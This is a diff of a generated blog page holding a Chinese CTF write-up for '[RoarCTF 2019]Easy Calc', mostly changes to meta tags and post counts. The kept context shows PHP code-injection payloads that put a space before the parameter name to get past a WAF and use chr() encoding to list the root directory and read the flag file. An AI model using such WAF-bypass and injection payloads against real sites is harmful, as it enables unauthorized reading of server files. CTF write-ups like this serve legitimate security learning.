@@ -81,20 +81,20 @@
 
 
 
-<meta name="description" content="[RoarCTF 2019]Easy Calc方法一：PHP特性在参数名称前加空格即“ num”，waf识别为“ num”，但是PHP解析时会自动将空格去掉。 由于过滤了“ / ”，我们构造payload如下： 1234calc.php? num=var_dump(scandir(chr(47)))calc.php? num=var_dump(file_get_contents(chr(47).c">
+<meta name="description" content="[RoarCTF 2019]Easy Calc">
 <meta name="keywords" content="CTF,PHP,HTTP走私">
 <meta property="og:type" content="article">
 <meta property="og:title" content="[RoarCTF 2019]Easy Calc">
 <meta property="og:url" content="http://goudanjun.vip/2021/01/17/-RoarCTF-2019-Easy-Calc.html/index.html">
 <meta property="og:site_name" content="Goudan&#39;s blog">
-<meta property="og:description" content="[RoarCTF 2019]Easy Calc方法一：PHP特性在参数名称前加空格即“ num”，waf识别为“ num”，但是PHP解析时会自动将空格去掉。 由于过滤了“ / ”，我们构造payload如下： 1234calc.php? num=var_dump(scandir(chr(47)))calc.php? num=var_dump(file_get_contents(chr(47).c">
+<meta property="og:description" content="[RoarCTF 2019]Easy Calc">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="https://i.loli.net/2021/01/12/KbxzFBj6M7adSGm.png">
 <meta property="og:image" content="https://i.loli.net/2021/01/12/FxA6fmstJRy4dK1.png">
-<meta property="og:updated_time" content="2021-01-17T12:27:03.480Z">
+<meta property="og:updated_time" content="2021-01-17T13:01:53.070Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="[RoarCTF 2019]Easy Calc">
-<meta name="twitter:description" content="[RoarCTF 2019]Easy Calc方法一：PHP特性在参数名称前加空格即“ num”，waf识别为“ num”，但是PHP解析时会自动将空格去掉。 由于过滤了“ / ”，我们构造payload如下： 1234calc.php? num=var_dump(scandir(chr(47)))calc.php? num=var_dump(file_get_contents(chr(47).c">
+<meta name="twitter:description" content="[RoarCTF 2019]Easy Calc">
 <meta name="twitter:image" content="https://i.loli.net/2021/01/12/KbxzFBj6M7adSGm.png">
 
 
@@ -356,7 +356,9 @@
       
 
       
-        <h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><h2 id="方法一：PHP特性"><a href="#方法一：PHP特性" class="headerlink" title="方法一：PHP特性"></a>方法一：PHP特性</h2><p>在参数名称前加空格即“ num”，waf识别为“ num”，但是PHP解析时会自动将空格去掉。</p>
+        <h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><a id="more"></a>
+
+<h2 id="方法一：PHP特性"><a href="#方法一：PHP特性" class="headerlink" title="方法一：PHP特性"></a>方法一：PHP特性</h2><p>在参数名称前加空格即“ num”，waf识别为“ num”，但是PHP解析时会自动将空格去掉。</p>
 <p>由于过滤了“ / ”，我们构造payload如下：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">calc.php? num=var_dump(scandir(chr(<span class="number">47</span>)))</span><br><span class="line">calc.php? num=var_dump(file_get_contents(chr(<span class="number">47</span>).chr(<span class="number">102</span>).chr(<span class="number">49</span>).chr(<span class="number">97</span>).chr(<span class="number">103</span>).chr(<span class="number">103</span>)))</span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line">calc.php? num=var_dump(file_get_contents(chr(<span class="number">47</span>).f1agg))</span><br></pre></td></tr></table></figure>
 
@@ -505,7 +507,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-count">13</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -518,7 +520,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-count">14</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
